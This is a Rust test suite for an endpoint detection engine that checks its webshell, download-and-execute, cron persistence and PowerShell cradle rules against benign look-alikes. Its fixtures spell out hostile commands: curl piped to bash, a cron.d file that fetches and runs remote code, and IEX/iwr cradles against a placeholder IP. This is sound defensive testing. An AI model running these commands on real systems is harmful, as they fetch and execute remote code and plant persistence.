use detection::{
    compile_sigma_rule, Confidence, DetectionEngine, EventClass, TelemetryEvent, TemporalEngine,
};
const BOOTSTRAP: &str = include_str!("detection_bootstrap.rs");
fn boot_engine(include_pack: bool) -> DetectionEngine {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let tmp = std::env::temp_dir().join(format!("rafix-absent-{}", std::process::id()));
    let sources = super::DetectionSourcePaths {
        sigma_dir: if include_pack {
            root.join("rules/sigma")
        } else {
            tmp.join("sigma")
        },
        yara_dir: tmp.join("yara"),
        ioc_dir: tmp.join("ioc"),
        control_plane_peers: vec![],
    };
    let mut engine = super::build_detection_engine_with_ransomware_policy(
        detection::RansomwarePolicy::default(),
        &sources,
    );
    // Synthetic Windows semantic proof: ONLY the native product filter differs.
    // Native filtering itself is covered separately; Windows CI runs it natively.
    if !cfg!(target_os = "windows") {
        for part in BOOTSTRAP.split("const SIGMA_").skip(1) {
            let yaml = part
                .split_once("r#\"")
                .unwrap()
                .1
                .split_once("\"#;")
                .unwrap()
                .0;
            if yaml.contains("  product: windows") {
                engine
                    .load_sigma_rule_yaml(&yaml.replace("  product: windows\n", ""))
                    .unwrap();
            }
        }
    }
    engine
}
fn ev(class: EventClass, process: &str, parent: &str, command: &str) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({"ts_unix":1,"event_class":class,"pid":900,"ppid":1,"uid":1000,
        "process":process,"parent_process":parent,"session_id":900,"file_path":if process.ends_with(".exe") { format!(r"C:\Windows\System32\{process}") } else { format!("/usr/bin/{process}") },"file_write":false,
        "command_line":command,"container_escape":false,"container_privileged":false})).unwrap()
}
fn fires(name: &str, sequence: &[TelemetryEvent]) -> bool {
    let mut engine = boot_engine(false);
    sequence.iter().enumerate().any(|(i, e)| {
        let mut e = e.clone();
        e.ts_unix += i as i64;
        let out = engine.process_event(&e);
        match name {
            "SIGMA_DOWNLOAD_EXEC" => {
                out.temporal_hits
                    .iter()
                    .any(|n| n == "phi_download_pipe_shell")
                    || out
                        .exploit_indicators
                        .iter()
                        .any(|n| n.starts_with("fileless_pipe_exec"))
            }
            "SIGMA_WEBSHELL" => out.temporal_hits.iter().any(|n| n == "phi_webshell"),
            "SIGMA_PERSISTENCE" => out
                .temporal_hits
                .iter()
                .any(|n| n == "phi_persistence_write"),
            "SIGMA_WIN_PS_DOWNLOAD_CRADLE" => out
                .temporal_hits
                .iter()
                .any(|n| n == "eguard_win_ps_download_cradle"),
            _ => panic!("unknown target {name}"),
        }
    })
}
fn webshell_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let start = ev(EventClass::ProcessExec, "sh", "nginx", "sh -c id");
    let mut net = ev(EventClass::NetworkConnect, "sh", "nginx", "");
    net.dst_ip = Some("203.0.113.9".into());
    net.dst_port = Some(4444);
    assert!(fires("SIGMA_WEBSHELL", &[start.clone(), net.clone()]));
    assert!(!fires(
        "SIGMA_WEBSHELL",
        &[ev(
            EventClass::ProcessExec,
            "sh",
            "apache2",
            "sh -c 'convert a.png b.jpg'"
        )]
    ));
    net.dst_ip = Some("127.0.0.1".into());
    net.dst_port = Some(443);
    assert!(!fires("SIGMA_WEBSHELL", &[start, net]));
}
fn download_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    assert!(fires(
        "SIGMA_DOWNLOAD_EXEC",
        &[ev(
            EventClass::ProcessExec,
            "sh",
            "bash",
            "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
        )]
    ));
    assert!(!fires(
        "SIGMA_DOWNLOAD_EXEC",
        &[ev(
            EventClass::ProcessExec,
            "curl",
            "bash",
            "curl -O https://releases.example.org/tool.tgz"
        )]
    ));
}
fn unrelated_download_case(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let download = ev(
        EventClass::ProcessExec,
        "curl",
        "cron",
        "curl https://hc-ping.example/uuid",
    );
    let mut unrelated = ev(
        EventClass::ProcessExec,
        "bash",
        "sshd",
        "/bin/bash /home/synthetic/deploy.sh",
    );
    unrelated.pid = 901;
    assert!(!fires("SIGMA_DOWNLOAD_EXEC", &[download, unrelated]));
}

fn persistence_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let mut write = ev(
        EventClass::FileOpen,
        "bash",
        "sshd",
        "bash -c 'echo curl http://203.0.113.9/x | sh > /etc/cron.d/upd'",
    );
    write.file_path = Some("/etc/cron.d/upd".into());
    write.file_write = true;
    assert!(fires("SIGMA_PERSISTENCE", &[write.clone()]));
    assert!(!fires(
        "SIGMA_PERSISTENCE",
        &[ev(
            EventClass::ProcessExec,
            "systemctl",
            "sudo",
            "systemctl enable --now docker"
        )]
    ));
    write.process = "dpkg".into();
    write.command_line = None;
    write.file_path = Some("/etc/cron.d/sysstat".into());
    assert!(!fires("SIGMA_PERSISTENCE", &[write]));
}
fn powershell_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    for command in ["powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\"", "powershell -c \"iwr http://203.0.113.9/a.ps1 -UseBasicParsing | iex\""] {
        assert!(fires("SIGMA_WIN_PS_DOWNLOAD_CRADLE", &[ev(EventClass::ProcessExec, "powershell.exe", "explorer.exe", command)]));
    }
    for command in ["powershell.exe -c (New-Object Net.WebClient).DownloadString('https://api.ipify.org')", "powershell.exe -c Invoke-WebRequest https://vendor.example/tool.zip -OutFile C:\\Temp\\tool.zip"] {
        assert!(!fires("SIGMA_WIN_PS_DOWNLOAD_CRADLE", &[ev(EventClass::ProcessExec, "powershell.exe", "explorer.exe", command)]));
    }
}

fn pack_fires(_: &str, sequence: &[TelemetryEvent]) -> bool {
    let mut engine = TemporalEngine::with_default_rules();
    for line in BOOTSTRAP
        .lines()
        .map(str::trim)
        .filter(|line| line.starts_with("const SIGMA_"))
    {
        let name = line
            .split_whitespace()
            .nth(1)
            .unwrap()
            .trim_end_matches(':');
        let marker = format!("const {name}: &str = r#\"");
        let yaml = BOOTSTRAP
            .split_once(&marker)
            .unwrap()
            .1
            .split_once("\"#;")
            .unwrap()
            .0;
        let yaml = yaml.replace("  product: windows\n", "");
        match compile_sigma_rule(&yaml) {
            Ok(rule) => engine.add_rule(rule),
            Err(reason) => eprintln!("builtin {name} skipped: {reason}"),
        }
    }
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
    let mut paths: Vec<_> = std::fs::read_dir(root)
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().and_then(|s| s.to_str()) == Some("yml"))
        .collect();
    paths.sort();
    for path in paths {
        let source = std::fs::read_to_string(path)
            .unwrap()
            .replace("  product: windows\n", "")
            .replace("  product: linux\n", "");
        engine.add_rule(compile_sigma_rule(&source).unwrap());
    }
    let mut hits = Vec::new();
    for (i, event) in sequence.iter().enumerate() {
        let mut event = event.clone();
        event.ts_unix += i as i64;
        hits.extend(engine.observe(&event));
    }
    if !hits.is_empty() {
        eprintln!("pack hits: {hits:?}");
    }
    !hits.is_empty()
}

#[test]
fn pack_webshell_recall_and_precision() {
    webshell_cases(pack_fires);
}

#[test]
fn merged_webshell_keeps_attack_and_excludes_local_or_no_connect_hooks() {
    webshell_cases(fires);
}

#[test]
fn pack_download_recall_and_precision() {
    download_cases(pack_fires);
}

#[test]
fn merged_download_exec_keeps_pipe_attack_not_unrelated_shell() {
    download_cases(fires);
    unrelated_download_case(fires);
}

#[test]
fn pack_persistence_recall_and_precision() {
    persistence_cases(pack_fires);
}

#[test]
fn merged_persistence_keeps_cron_write_not_package_or_service_administration() {
    persistence_cases(fires);
}

#[test]
fn pack_powershell_recall_and_precision() {
    powershell_cases(pack_fires);
}

#[test]
fn merged_powershell_keeps_both_execution_forms_not_download_only() {
    powershell_cases(fires);
}

#[test]
fn pack_download_unrelated_shell_is_quiet() {
    unrelated_download_case(pack_fires);
}

#[test]
fn retained_download_declares_medium_and_matches_rustup() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../rules/sigma/linux_download_exec.yml");
    let source = std::fs::read_to_string(root)
        .unwrap()
        .replace("  product: linux\n", "");
    assert_eq!(
        compile_sigma_rule(&source).unwrap().level,
        detection::RuleLevel::Medium
    );
    let mut engine = TemporalEngine::new();
    engine.add_rule(compile_sigma_rule(&source).unwrap());
    let hits = engine.observe(&ev(
        EventClass::ProcessExec,
        "sh",
        "bash",
        "sh -c 'curl https://sh.rustup.rs -sSf | sh'",
    ));
    assert_eq!(hits, vec!["linux_download_exec"]);
}

fn full_pack_engine_for_integration() -> DetectionEngine {
    boot_engine(true)
}

#[test]
fn rustup_installer_chain_has_one_alert_at_most_medium() {
    // Must-fire positive control in the SAME full-engine harness.
    let mut attack = full_pack_engine_for_integration();
    assert!(
        attack
            .process_event(&ev(
                EventClass::ProcessExec,
                "sh",
                "bash",
                "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
            ))
            .confidence
            >= Confidence::Medium
    );
    let mut engine = full_pack_engine_for_integration();
    let start = ev(
        EventClass::ProcessExec,
        "sh",
        "bash",
        "sh -c 'curl https://sh.rustup.rs -sSf | sh'",
    );
    let mut curl = ev(
        EventClass::ProcessExec,
        "curl",
        "sh",
        "curl https://sh.rustup.rs -sSf",
    );
    curl.pid = 901;
    curl.ppid = 900;
    let mut shell = ev(EventClass::ProcessExec, "sh", "sh", "sh");
    shell.pid = 902;
    shell.ppid = 900;
    let mut alerts = Vec::new();
    for (i, mut event) in [start, curl, shell].into_iter().enumerate() {
        event.ts_unix += i as i64;
        let outcome = engine.process_event(&event);
        if outcome.confidence > Confidence::None {
            alerts.push((outcome.confidence, outcome.temporal_hits));
        }
    }
    assert_eq!(alerts.len(), 1, "duplicate alerts: {alerts:?}");
    assert!(
        alerts[0].0 <= Confidence::Medium,
        "ordinary installer exceeded MEDIUM: {alerts:?}"
    );
}

#[test]
fn production_pipeline_matrix_uses_runtime_shard_resolver() {
    let _guard = crate::lifecycle::shared_env_var_lock().lock().unwrap();
    let previous = std::env::var_os("EGUARD_DETECTION_SHARDS");
    std::env::remove_var("EGUARD_DETECTION_SHARDS");
    let shards = crate::lifecycle::resolve_detection_shard_count();
    let mut failures = Vec::new();
    for include_pack in [false, true] {
        for wrapped in [false, true] {
            for (download, parent, expected) in [
                (
                    "curl https://download.invalid/x",
                    "bash",
                    Confidence::Medium,
                ),
                ("curl http://download.invalid/x", "bash", Confidence::High),
                ("curl https://198.51.100.9/x", "bash", Confidence::High),
                ("curl https://download.invalid/x", "nginx", Confidence::High),
                (
                    "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs",
                    "bash",
                    Confidence::Medium,
                ),
            ] {
                let state = crate::detection_state::SharedDetectionState::new_with_shards(
                    boot_engine(include_pack),
                    None,
                    shards,
                    || boot_engine(include_pack),
                );
                let mut p = ev(
                    EventClass::ProcessExec,
                    if wrapped { "sh" } else { parent },
                    if wrapped { parent } else { "sshd" },
                    if wrapped { "" } else { parent },
                );
                p.pid = 901;
                p.ppid = 900;
                p.session_id = 900;
                if wrapped {
                    p.command_line = Some(format!("sh -c \"{download} | sh\""));
                }
                let mut curl = ev(
                    EventClass::ProcessExec,
                    "curl",
                    if wrapped { "sh" } else { parent },
                    download,
                );
                curl.pid = 902;
                curl.ppid = 901;
                curl.session_id = 901;
                curl.ts_unix = 2;
                let mut shell = ev(
                    EventClass::ProcessExec,
                    "sh",
                    if wrapped { "sh" } else { parent },
                    "sh",
                );
                shell.pid = 903;
                shell.ppid = 901;
                shell.session_id = 901;
                shell.ts_unix = 3;
                let outcomes: Vec<_> = [p, curl, shell]
                    .iter()
                    .map(|e| state.process_event(e).unwrap())
                    .collect();
                let suppressed = outcomes.iter().filter(|o| o.pipe_alert_suppressed).count();
                let alerts: Vec<_> = outcomes
                    .iter()
                    .filter(|o| o.confidence > Confidence::None)
                    .collect();
                if alerts.len() != 1
                    || alerts[0].confidence != expected
                    || suppressed != usize::from(wrapped)
                {
                    failures.push(format!("pack={include_pack} wrapped={wrapped} parent={parent} {download} expected={expected:?} suppressed={suppressed} outcomes={outcomes:?}"));
                }
                if wrapped {
                    let state = crate::detection_state::SharedDetectionState::new_with_shards(
                        boot_engine(include_pack),
                        None,
                        shards,
                        || boot_engine(include_pack),
                    );
                    let mut only = ev(
                        EventClass::ProcessExec,
                        "sh",
                        parent,
                        &format!("sh -c \"{download} | sh\""),
                    );
                    only.pid = 901;
                    only.ppid = 900;
                    only.session_id = 900;
                    let o = state.process_event(&only).unwrap();
                    if o.confidence != expected || o.pipe_alert_suppressed {
                        failures.push(format!("wrapper-only {download}: {o:?}"));
                    }
                }
            }
        }
    }
    if let Some(previous) = previous {
        std::env::set_var("EGUARD_DETECTION_SHARDS", previous);
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}
